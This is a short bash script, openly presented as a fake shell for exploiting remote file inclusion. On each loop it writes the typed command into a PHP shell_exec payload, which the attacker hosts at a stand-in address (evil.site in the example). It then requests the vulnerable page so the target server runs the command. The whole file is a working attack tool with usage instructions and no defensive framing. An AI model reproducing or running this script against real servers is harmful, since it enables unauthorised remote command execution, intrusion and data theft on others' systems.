#!/bin/bash

# This script is a really simple fake shell to use via RFI
# Usage: ./rfishell.sh <rfi url with your locally hosted file> <local file path>
# Example: ./rfishell https://example.com/section.php?page=http://evil.site/bl1ngrfi ~/evil/blingrfi.php

rfiurl=$1
localfile=$2

function comm {
	echo "<?php echo shell_exec('${cmd}'); ?>" > ${localfile}
	curl -k ${rfiurl}
	echo ""
}

m=1
trap '{ echo " Exiting"; m=0; }' SIGINT

while (( m )); do
	echo -n "[^-^]> "
	read cmd
	comm
done